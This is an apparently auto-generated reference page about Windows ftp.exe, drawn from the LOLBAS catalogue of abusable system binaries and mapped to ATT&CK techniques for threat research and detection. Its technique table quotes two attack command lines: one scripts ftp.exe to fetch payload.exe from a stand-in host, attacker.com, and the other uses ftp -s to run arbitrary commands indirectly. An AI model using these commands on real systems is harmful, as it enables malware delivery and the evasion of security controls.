---
parsed_by: focuslocust
source: lolbas
type: generated
---
# Ftp.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `ftp.exe` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Ftp.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

A binary designed for connecting to FTP servers

## Fast Retrieval

- Platform: `windows`
- Command page: [commands](../../commands/windows/ftp.md)
- Source verification: [source record](../../sources/lolbas/ftp.exe.md)

## Aliases

- `Ftp.exe`
- `ftp.exe`

## Related ATT&CK Techniques

| Item | Relationship | Confidence | Evidence |
| --- | --- | --- | --- |
| [T1105 - Ingress Tool Transfer](../../attack/techniques/T1105-ingress-tool-transfer.md) | explicit | source | Command metadata lists T1105: cmd.exe /c "@echo open attacker.com 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo quit>>ftp.tx... |
| [T1202 - Indirect Command Execution](../../attack/techniques/T1202-indirect-command-execution.md) | explicit | source | Command metadata lists T1202: echo !{CMD} > ftpcommands.txt && ftp -s:ftpcommands.txt |

## Detection / Analysis Notes

This source record contains detection or analysis material. It is preserved on the source-record page rather than promoted into a full detection engineering page.

[source record](../../sources/lolbas/ftp.exe.md)

## Source Verification

[source record](../../sources/lolbas/ftp.exe.md)

## Evidence Excerpt

```text
Acknowledgement:
- Handle: '@subtee'
Person: Casey Smith
- Handle: ''
Person: BennyHusted
- Handle: '@0xAmit'
Person: Amit Serper
Author: Oddvar Moe
```
